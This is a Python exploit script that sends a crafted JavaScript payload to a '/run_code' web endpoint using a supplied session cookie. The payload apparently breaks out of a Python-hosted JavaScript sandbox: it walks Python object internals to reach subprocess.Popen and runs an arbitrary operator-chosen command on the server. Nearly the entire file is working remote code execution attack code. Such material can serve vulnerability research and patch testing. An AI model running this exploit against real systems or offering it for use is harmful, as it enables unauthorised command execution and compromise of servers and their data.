import requests
import json

def main():
    host, port, cmd, session = input("host: "), int(input("port: ")), input("cmd: "), input("session: ")
    url = f"http://{host}:{port}/run_code"
    headers = {
        "Host": f"{host}:{port}",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/json",
        "Origin": f"http://{host}:{port}",
        "Connection": "keep-alive",
        "Cookie": f'session="{session}"',
        "Priority": "u=0"
    }
    payload = f"""
let cmd = "{cmd}"
let hacked, bymarve, n11
let getattr, obj

hacked = Object.getOwnPropertyNames({{}})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__

function findpopen(o) {{
    let result;
    for(let i in o.__subclasses__()) {{
        let item = o.__subclasses__()[i]
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {{
            return item
        }}
        if(item.__name__ != "type" && (result = findpopen(item))) {{
            return result
        }}
    }}
}}

n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
console.log(n11)
n11
"""

    data = {
        "code" : f"{payload}"
    }

    try:
        response = requests.post(
            url = url,
            headers=headers,
            json=data,
            timeout=10 
        )    
        print(response.text)
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
if __name__ == "__main__":
    main()
